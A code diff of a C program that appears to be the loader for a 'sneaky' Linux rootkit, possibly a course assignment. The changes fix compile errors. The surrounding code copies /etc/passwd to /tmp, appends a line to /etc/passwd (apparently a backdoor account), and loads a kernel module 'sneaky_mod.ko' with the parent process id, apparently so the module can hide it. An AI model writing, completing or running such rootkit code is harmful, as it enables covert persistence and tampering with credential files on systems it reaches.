@@ -6,7 +6,7 @@
 
 const char* original_file = "/etc/passwd";
 const char* temp_file = "/tmp/passwd";
-const char* module_name = "sneaky_mod.ko"
+const char* module_name = "sneaky_mod.ko";
 
 void CopyFile(const char* src_file, const char* dst_file) {
 
@@ -46,7 +46,6 @@ void LoadModule(const char * module_name) {
 		pid_t ppid = getppid();
 		char arg[40];
 		sprintf(arg,"sneaky_process_id=%d", (int)ppid);
-
 		int execReturn = execl("/sbin/insmod", "insmod", module_name, arg, (char*)0);
 		if(execReturn == -1) {
 			perror("load module exec error");
@@ -69,7 +68,7 @@ void UnloadModule(const char * module_name) {
 		perror("unload module fork error");
 		exit(EXIT_FAILURE);
 	} else if (child_pid == 0) {
-		int execReturn = execl("/sbin/rmmod", "rmmod", module_name, 0);
+		int execReturn = execl("/sbin/rmmod", "rmmod", module_name, (char *)0);
 		if(execReturn == -1) {
 			perror("unload module exec error");
 			exit(EXIT_FAILURE);
@@ -96,7 +95,7 @@ int main () {
 	AddLine(original_file);
 
 	//Load the kernel module
-	LoadModule();
+	LoadModule(module_name);
 
 	//Wait for 'q'
 	while (getchar() != 'q') {	
